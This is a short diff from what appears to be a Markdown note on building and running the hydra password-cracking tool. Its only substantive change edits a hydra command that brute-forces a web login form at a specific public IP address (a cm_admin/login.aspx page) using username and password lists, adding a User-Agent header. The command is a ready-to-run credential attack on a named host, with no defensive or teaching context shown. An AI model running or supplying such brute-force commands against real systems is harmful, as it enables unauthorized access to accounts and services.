@@ -25,7 +25,7 @@ pacman -S --noconfirm --needed gcc make
 make
 make install
 
-hydra -V -F -L username.txt -P password.txt -o ok.txt 'http-post-form://222.69.159.53:80/cm_admin/login.aspx:txtloginid=^USER^&txtpsw=^PASS^:F=password incorrect!'
+hydra -V -F -L username.txt -P password.txt -o ok.txt 'http-post-form://222.69.159.53:80/cm_admin/login.aspx:txtloginid=^USER^&txtpsw=^PASS^:F=password incorrect!:H=User-Agent\: wget'
 ```
 
 ## Reference
